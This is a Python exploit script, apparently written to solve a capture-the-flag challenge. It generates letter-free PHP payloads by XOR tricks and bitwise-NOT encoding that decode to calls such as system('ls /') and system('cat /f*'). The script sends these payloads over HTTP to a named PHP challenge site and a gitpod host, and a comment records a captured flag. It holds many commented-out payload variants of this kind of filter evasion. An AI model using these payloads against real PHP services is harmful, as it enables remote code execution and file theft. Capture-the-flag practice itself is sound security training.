import string
import requests
from operator import *


def xor(str1, str2):
    result = []
    for i, j in zip(str1, str2):
        result.append(chr(ord(i) ^ ord(j)))
        return ''.join(result)


def get_xor_strings(expected, valids):
    word1 = ""
    word2 = ""
    for i in expected:
        ok = False
        for valid in valids:
            result = chr(ord(i) ^ ord(valid))
            if result in valids:
                word1 = word1 + result
                word2 = word2 + valid
                ok = True
                break
        if not ok:
            print('BADDDDDDDDDDDDDDDDD')
    return word1, word2


valids = []

count = 0
for codepoint in range(2 ** 16):
    ch = chr(codepoint)
    if not ch.isprintable():
        valids.append(ch)
        count = count + 1

# for item in string.printable:
#     black = ['`', '%']
#     if item not in string.ascii_letters and item not in string.digits and item not in black:
#         valids.append(item)

valids = valids[:100]
print("[+] Generated valids => {}".format(valids))

expected = "exec"
word1, word2 = get_xor_strings(expected, valids)
print("[+] Word 1 {}- Word2 {}".format(word1, word2))

result = xor(word1, word2)
print("[+] Verifying... Should be {} => {}".format(expected, result))


expected = "ls"
word3, word4 = get_xor_strings(expected, valids)
print("[+] Word 3 {}- Word 4 {}".format(word3, word4))

result = xor(word3, word4)
print("[+] Verifying... Should be {} => {}".format(expected, result))


# expected = "ls"
# worda1, worda2 = get_xor_strings(expected, valids)
# print("[+] Word 1 {}- Word2 {}".format(worda1, worda2))

# result = xor(word3, word4)
# print("[+] Verifying... Should be {} => {}".format(expected, result))

# payload = "(\"{}\"^\"{}\")();".format(word1, word2)
# payload = f'''
# $_ = "{worda1}";
# $__ = "{worda2}";
# $___ = $_ ^ $__;
# $___;
# '''
# payload = 'system(ls);'
# payload = f'("{word1}"^"{word2}");'
# payload = f'("{word1}"^"{word2}")();'
# payload = f'("{word1}"^"{word2}")("{word3}"^"{word4}");'
# payload = f'("{word1}"^"{word2}")("{word3}"^"{word4}");'
# payload = f'$_="{{{{"^"$<>/";$$_[_]($$_[__]);'
# payload = f'$_="{word3}"^"{word4}";("{word1}"^"{word2}")' + "(${$_}[_]);"
# payload = '$_="#{{{{"^"|<>/";$$_[_]($$_[__]);'
# "("666666"^"666666")("aaaa"^"aaaa")" 35
# "("6666"^"6666")("aaaa"^"aaaa")" 31
# payload = '$_="{{{{"^"$<>/";$$_[_]();'
# payload = '$_={{{{^$<>/;$$_[_]($$_[__]);'
# payload = '$_="{{{{"^"$<>/";$$_[_]();'
# payload = '$_="{{{{"^"$<>/";$$_[_]($$_[__]);'
# payload = '$_="{{{{"^"$<>/";$__=~%9c%9e%8b;$__($$_[_]);'
payload = '$_=_.("\x18\x1a\x0b"^___);$$_[_]($$_[__]);'
# payload = '$_="$\x18\x1a\x0b"^____;$$_[_]($$_[__]);'
# payload = '$_="{{{{"^"$<>/";$_=$$_;$_[_];'
# payload = '$_="{{{{"^"$<>/";$$_[_]($$_[__]);'
# payload = '$_="{{{{"^"$<>/";$$_[_]($$_[__]);'
# payload = '$🐱=$🐱[0];$_="{{{{"^"$<>/";$$_[_]($$_[__]);'
# payload = '$_=`/???/???%20/????`;?><?=$_?>;'
# payload = f'?><?="{word1}"^"{word2}"();?>'
# payload = f'?><?=("{word1}"^"{word2}")("{word3}"^"{word4}");?>'
payload = '(~%8F%97%8F%96%91%99%90)();'
payload = '(~%8C%86%8C%8B%9A%92)();'  # system();

# system("ls /");
payload = '(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0);'  
# flag_GV99N6HuFj1kpkV45Dp7A6Usk5s5nLUY

# system("cat /f*");
payload = '(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%D5);' 

payload = '(~"%8C%86%8C%8B%9A%92")(~"%9C%9E%8B%DF%D0%99%D5");'


# m = "_GET"
# c = ''
# for ch in m:
#     c += chr(~ord(ch))
# print(c)
# payload = f'$_=~"{c}";$$_[_]($$_[__]);'
# payload = '$_="#{{{"^"|<>/";{' + f'"{word1}"^"{word2}"' +'}(${$_}[__]);'
# payload = '$_="#{{{"^"|<>/";${$_}[_=$<;{$<}]({$<}__]);'
# payload = f'$_="{word1}"^"{word2}";$__="{word3}"^"{word4}"." -a";$_($__);'
print(payload)
print("[+] Sending payload {}".format(payload))

params = (
    ('(#°д°)', payload),
    ('_', 'system'),
    # ('_', 'system'),
    # ('_', 'system'),
    ('__', 'ls'),
)

root = 'https://php.splitline.tw/'
myRoot = 'https://8000-a1ab3e29-67c2-43d6-908e-24b7ee4c6561.ws-us02.gitpod.io/'
response = requests.get(f'{myRoot}', params=params)
print(response.content.decode())
print(len(payload))
print(len(word1))
print(len(word2))
print(len(word3))
print(len(word4))
print(word1)
print(word2)
print(word3)
print(word4)
print(len(payload) < 0x20)

# response.raise_for_status()  # ensure we notice bad responses
file = open("./resp_text.html", "w")
file.write(response.text)
file.close()
